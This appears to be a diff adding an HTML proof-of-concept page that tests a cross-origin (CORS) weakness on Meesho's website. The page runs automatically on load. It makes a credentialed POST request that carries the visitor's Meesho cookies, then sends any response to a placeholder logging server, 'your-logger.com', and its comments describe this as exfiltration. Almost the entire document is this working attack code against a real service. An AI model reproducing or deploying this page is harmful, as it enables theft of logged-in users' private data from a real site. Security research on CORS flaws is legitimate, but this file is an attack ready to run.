@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head><title>Meesho CORS Test</title></head>
+<body>
+<h2>Meesho CORS PoC - Open this after logging into Meesho</h2>
+
+<script>
+async function testCORS() {
+  const url = "https://www.meesho.com/zMrsM4/K1zIxg/4/c3d/L0g4NSwh/Oauuppi50brE0JEGiw/ATJQAQ/ZD/JXERNKOUsB";
+
+  try {
+    const res = await fetch(url, {
+      method: "POST",
+      credentials: "include",        // This sends your Meesho cookies
+      headers: {
+        "Content-Type": "text/plain;charset=UTF-8",
+        "Origin": window.location.origin   // Uses your current domain automatically
+      },
+      body: "test data from attacker"     // You can change this
+    });
+
+    console.log("Status:", res.status);
+    console.log("Headers:", [...res.headers]);
+
+    const data = await res.text();
+    console.log("Response Body:", data);
+
+    // Exfiltrate result to your server
+    if (data && data.length > 2) {
+      fetch(`https://your-logger.com/log?status=${res.status}&data=${encodeURIComponent(data)}`);
+      alert("✅ Got response! Check browser console.");
+    } else {
+      console.log("Empty or no data returned");
+    }
+
+  } catch (e) {
+    console.error("Fetch failed:", e);
+    alert("Request blocked by CORS or other error. Check console.");
+  }
+}
+
+// Run automatically
+testCORS();
+</script>
+</body>
+</html>
